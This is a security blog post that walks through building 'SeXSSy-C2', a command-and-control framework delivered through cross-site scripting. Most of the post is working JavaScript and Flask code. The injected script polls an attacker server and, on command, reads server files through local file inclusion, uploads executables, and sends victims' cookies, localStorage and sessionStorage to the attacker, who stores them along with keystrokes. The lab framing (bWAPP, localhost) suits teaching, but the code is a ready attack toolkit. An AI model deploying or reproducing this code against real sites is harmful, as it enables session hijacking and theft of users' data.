---
layout: post
title:  "Offensive XSS 3: C2"
date:   2022-04-20 18:05:55 +0300
image:  OffensiveXSS3/title.jpg
author-name: strik1r
tags:   [XSS, data extraction, Exploit via XSS]
---

<h2>Prologue:</h2>
In this blog post we will start our offensive operations using XSS and upgrade what we created in the previous posts. We are currently capable of uploading files, downloading different data from the victim etc. However for each operation we need to clear our previous XSS payload, inject a new payload, then wait for the victim to trigger our XSS payload. In this blog post let's try to fix that issue by making sure multiple executions are not necessary. We will be creating building blocks for our SeXSSy-C2 framework which will be released after our blog posts. 
<br>
<h3>Problem Statement</h3>
Assuming we have a usual CTF scenario where the admin only clicks our payload embedded link every one hour or so. It is super time consuming to wait for hours on the end to get the payload right. We understand that all we need is a single right execution and from there on we need to have a script that is capable of capturing and uploading data without any modifications.
<br>

<h2>SeXSSy-C2 - First Jab v0.0.0</h2>
Well, the initial idea is to create an endpoint that will return arbitrary value other than an empty string then invoke it. Our idea is to create an asychronous C2 connection with our victim which will check back-in time to time. We're gonna implement async functions for the same. This automatically decreases our need for victim's interaction to trigger the payload everytime we want an execution. So here's the initial code for the same:
<br>
```
@app.route("/command", methods=['POST'])
def command():
    return "command=test"
```
<br>
XSS Script to invoke it:
<br>
```
commandUrl = "http://127.0.0.1:5000/command"
async function getCommand() {
    let response = await fetch(commandUrl,{
        headers: 
        {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
    let text = await response.text()
    console.log(text)
}
getcommand()

```
Understanding the above script in detail. We are creating an async function so that this command request will not block the script while we wait for the response. With the "await" we're letting the JavaScript execution know that this part needs to wait until the response is fetched. Post that we will wait for the response.text and  write the result to the console. Let's run it and see what happens.

![](/img/OffensiveXSS3/corsIssue.PNG)

After execution we do get a CORS error. We will not go deeply into internals of CORS and what CORS headers are; there are plenty of articles related to this topic and is not aligned with this blog post series. We only need to focus on the fact that our server does not allow our JavaScript execution on this page to read the response. This is because the correct CORS headers were not set. This is an easy to fix issue as we only need to import the CORS package from flask and set the headers like this and add a header to allow all origins with a *"*"*
<br>
```
from flask_cors import CORS
cors = CORS(app, resources={r"/*": {"origins": "*"}})
```
<br>
Boom! Our basic command execution works now! We can now receive commands from the server itself. Our base is set for the C2 and now we can add additional capabilities to it. 

![](/img/OffensiveXSS3/workingc2.PNG)


<h2>SeXSSy-C2 - LFI v0.0.1</h2>
Now that we have a base C2, we can upgrade the LFI attack so that we only need to send a command and the filepath as arguments and get the desired file. We will not need to reset the XSS payload for every file we would like to download or for every command we would want to execute. Firstly, let's check the server side code. We definitely need some workaround to get the current command and set the next one we would like to run. So here goes the code for it:

Updated getCommand & setCommand:
```
@app.route("/getCommand", methods=['POST'])
def getCommand():
    global command
    result = command
    command = ""
    return result


@app.route("/setCommand", methods=['POST'])
def setCommand():
    global command
    command = request.get_data()
    return command
```
<br>
Here the getCommand endpoint is where the XSS will receive the next command to execute. It only accepts HTTP POST requests now. An important step is to clear the command variable after we create the response body because the XSS would be checking back in every few seconds and we do not want to download the same file again and again. As for the set command function, it is the endpoint where we need to send a POST request to set the next command and its parameters. This will be sent back to our XSS when it hits getCommand again.
<br>
Updated saveFile:
```
@app.route("/saveFile", methods=['POST'])
def saveFile():
    separator = "/"
    mainFolder = "./LFIFiles"
    fileContent = request.form["fileContent"]
    fileName = request.form["fileName"]
    fileName = fileName.replace("../","")
    
    if fileName.startswith("/"):
        separator = ""
    fullPathFileName = mainFolder + separator + fileName
    filePath = '/'.join(fileName.split('/')[0:-1])
    storageFolder = mainFolder + separator + filePath

    if not os.path.exists(storageFolder):
        os.makedirs(storageFolder)
    f = open(fullPathFileName, "a")
    f.write(fileContent)
    f.write("\n")
    f.close()
    return ""
```
<br>
To improve this further, we also need to update the saveFile endpoint and command. Most of the parts are the same, however we added a small line to remove all the "../" from the file path. This is so that the XSS can just send back the filename and we can save it to the right place. Our code looks like this now:
<br>
```
serverURL = "http://127.0.0.1:5000"
commandUrl = serverURL + "/getCommand"
var command = "" 
var lfiFile = ""

const COMMAND = "command"
const LFIFILE = "lfiFile"

async function getCommand() {
    let response = await fetch(commandUrl,{
        headers: 
        {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
    let text = await response.text()
    splittedBody = text.split("&");
    splittedBody.forEach(function(element){
        parseCommand(element)
    });
}

async function runLFI() {
    var urlOfThePage = window.location.protocol + "//" + window.location.host
    lfiTarget = urlOfThePage + "/bWAPP/rlfi.php?language="+lfiFile+"&action=go";
    dataSaveUrl = serverURL + "/saveFile"
    let response = await fetch(lfiTarget);
    let data = await response.text();
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(data, 'text/html');
    
    var text = htmlDoc.getElementById("main").innerText;
    fileContent = text.substring(text.indexOf('Go') + 2);
    console.log(lfiFile)
    await fetch(dataSaveUrl,{
        body: "fileContent=" + encodeURIComponent(fileContent) + "&fileName=" + encodeURIComponent(lfiFile), 
        headers: 
        {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
}

async function executeCommand() {
    if (command == "lfi") {
        await runLFI()
    }

}

setInterval(function(){ 
    getCommand();
    executeCommand();
}, 1000);
```
<br>
The first few lines are just global parameter declarations and then we arrive to the core of the code. setInterval is tricky however it is just a while(true) sleep(1000) combination that JavaScript can understand and check back-in every periodic interval set. What it does is that every x millisecond (here 1000 so every 1 second) the content of the function will run (getCommand(); and executeCommand();)
As soon as we inject the script, we can see that the requests to getCommand are getting in and when we set the command to LFI and the desired file, we get a saveFile request and the file is fetched saved on our disk.

<h2>SeXSSy-C2 - v0.1</h2>
After few modifications we can import all of our previous scripts into one single file that we can control from our server. Keeping in mind that we intentionally made the script as close to the previous ones as we could. The priority was to make it as understandable as it can be.
<br>
c2.js:
```
serverURL = "http://127.0.0.1:5000"
commandUrl = serverURL + "/getCommand"
var command = "" 
var lfiFile = ""
var exit = false
var value = ""
var key = ""
var base64File = ""
var uploadFileName = ""
var contentType = "application/x-executable"

const COMMAND = "command"
const LFIFILE = "lfiFile"
const VALUE = "value"
const KEY = "key"
const BASE64FILE = "base64File"
const UPLOADFILENAME = "uploadFileName"
var contentType = "application/x-executable"

function parseCommand (element) {
    element = element.split("=");
    if (element[0] == COMMAND) {
        command = element[1];
    }
    if (element[0] == LFIFILE) {
        lfiFile = element[1];
    }
    if (element[0] == VALUE) {
        value = element[1];
    }
    if (element[0] == KEY) {
        key = element[1];
    }
    if (element[0] == BASE64FILE) {
        base64File = element[1];
    }
    if (element[0] == UPLOADFILENAME) {
        uploadFileName = element[1];
    }
}

function resetCommand(){
    command = "";
    lfiFile = "";
    value = "";
    key = "";
    base64File = "";
    uploadFileName = "";
}

async function getCommand() {
    let response = await fetch(commandUrl,{
        headers: 
        {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
    let text = await response.text()
    splittedBody = text.split("&");
    splittedBody.forEach(function(element){
        parseCommand(element)
    });
}

async function runLFI() {
    var urlOfThePage = window.location.protocol + "//" + window.location.host
    lfiTarget = urlOfThePage + "/bWAPP/rlfi.php?language="+lfiFile+"&action=go";
    dataSaveUrl = serverURL + "/saveFile"
    let response = await fetch(lfiTarget);
    let data = await response.text();
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(data, 'text/html');
    
    var text = htmlDoc.getElementById("main").innerText;
    fileContent = text.substring(text.indexOf('Go') + 2);
    console.log(lfiFile)
    await fetch(dataSaveUrl,{
        body: "fileContent=" + encodeURIComponent(fileContent) + "&fileName=" + encodeURIComponent(lfiFile), 
        headers: 
        {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
}

function base64toBlob(base64Data, contentType) {
    contentType = contentType || '';
    var sliceSize = 1024;
    var byteCharacters = atob(base64Data);
    var bytesLength = byteCharacters.length;
    var slicesCount = Math.ceil(bytesLength / sliceSize);
    var byteArrays = new Array(slicesCount);

    for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);

        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
            bytes[i] = byteCharacters[offset].charCodeAt(0);
        }
        byteArrays[sliceIndex] = new Uint8Array(bytes);
    }
    return new Blob(byteArrays, { type: contentType });
}

function fileUpload() {

    var b64file = base64File
    var blob = base64toBlob(b64file, contentType);
    
    var formData = new FormData();
    formData.append('file', blob, uploadFileName);
    formData.append('MAX_FILE_SIZE', 10);
    formData.append('form','Upload');
    
    var urlOfThePage = window.location.protocol + "//" + window.location.host
    var url = urlOfThePage + '/bWAPP/unrestricted_file_upload.php';
    xhr = new XMLHttpRequest();
    xhr.open('POST', url);
    xhr.withCredentials = "true";
    
    xhr.send(formData);
}

function getCookie() {
    var url = serverURL + "/saveCookie";
    var body = "a=" + document.cookie;
    xr = new XMLHttpRequest();
    xr.open("POST", url, true);
    xr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
    xr.send(body);
}

function setCookie() {
    document.cookie = key + "=" + value; 
}

function getLocalStorage() { 
    var data = window.localStorage.getItem(key);
    var i=new Image;
    i.src= serverURL + "/saveLocalStorage?a=" +data;
}

function setLocalStorage() { 
    localStorage.setItem(key, value)
}

function getSessionStorage() { 
    var data = window.sessionStorage.getItem(key);
    var i=new Image;
    i.src= serverURL + "/saveSessionStorage?a=" + data;
}

function setSessionStorage() { 
    sessionStorage.setItem(key, value)
}

async function executeCommand() {
    if (command == "lfi") {
        await runLFI()
    }

    if (command == "fileUpload") {
        fileUpload()
    }

    if (command == "getCookie") {
        getCookie()
    }

    if (command == "setCookie") {
        setCookie()
    }
    
    if (command == "getLocalStorage") {
        getLocalStorage()
    }

    if (command == "setLocalStorage") {
        setLocalStorage()
    }

    if (command == "getSessionStorage") {
        getSessionStorage()
    }

    if (command == "setSessionStorage") {
        setSessionStorage()
    }
    resetCommand()
}

setInterval(function(){ 
    getCommand();
    executeCommand();
}, 10000);
```
<br>
The scripts were created based on our previous posts with little to no modification. It is worth 
pointing out that the command parameters are reset after each command execution preventing the same command running multiple times. Most commands expect the parameters key and value except some special cases. This is a design thing and we can write our functions as we wish. 

c2Server.py:
```
from flask import Flask
from flask import request
from flask_cors import CORS
import os

app = Flask(__name__)
cors = CORS(app, resources={r"/*": {"origins": "*"}})

command = ""

@app.route("/saveCookie", methods=['POST', 'GET'])
def saveCookie():
    cookie = ""
    if request.method == 'GET':
        cookie = request.args.get("a")
    else:
        cookie = request.form["a"]
    f = open("savedCookies.txt", "a")
    f.write(cookie)
    f.write("\n")
    f.close()
    return ""

@app.route("/saveLocalStorage", methods=['POST', 'GET'])
def saveLocalStorage():
    localStorage = ""
    if request.method == 'GET':
        localStorage = request.args.get("a")
    else:
        localStorage = request.form["a"]
    f = open("savedLocalStorage.txt", "a")
    f.write(localStorage)
    f.write("\n")
    f.close()
    return ""

@app.route("/saveSessionStorage", methods=['POST', 'GET'])
def saveSessionStorage():
    sessionStorage = ""
    if request.method == 'GET':
        sessionStorage = request.args.get("a")
    else:
        sessionStorage = request.form["a"]
    f = open("savedSessionStorage.txt", "a")
    f.write(sessionStorage)
    f.write("\n")
    f.close()
    return ""

@app.route("/saveFile", methods=['POST'])
def saveFile():
    separator = "/"
    mainFolder = "./LFIFiles"
    fileContent = request.form["fileContent"]
    fileName = request.form["fileName"]
    fileName = fileName.replace("../","")
    
    if fileName.startswith("/"):
        separator = ""
    fullPathFileName = mainFolder + separator + fileName
    filePath = '/'.join(fileName.split('/')[0:-1])
    storageFolder = mainFolder + separator + filePath

    if not os.path.exists(storageFolder):
        os.makedirs(storageFolder)
    f = open(fullPathFileName, "a")
    f.write(fileContent)
    f.write("\n")
    f.close()
    return ""

@app.route("/keys", methods=['POST'])
def keys():
    keys = request.form["keys"]
    f = open("savedkeys.txt", "a")
    f.write(keys)
    f.write("\n")
    f.close()
    return ""


@app.route("/getCommand", methods=['POST'])
def getCommand():
    global command
    result = command
    command = ""
    return result


@app.route("/setCommand", methods=['POST'])
def setCommand():
    global command
    command = request.get_data()
    return command
```
<br>
<br>
![](/img/OffensiveXSS3/c2FileUpload.PNG)
<br>
<br>
![](/img/OffensiveXSS3/setCookie.PNG)
<br>
<br>
![](/img/OffensiveXSS3/saveCookie.PNG)

<h2>Epilogue:</h2>
We completed our Basic XSS posts with this post. We learnt how to add asynchronous communication to our C2. This helps us maintain a constant connection with the victim without user interaction. In our coming posts we're gonna add more and more capabilities to our SeXSSy-C2 and make it a full fledged XSS C2 framework. We hope it was useful, informative and we will see you in the upcoming Offensive XSS blog posts.
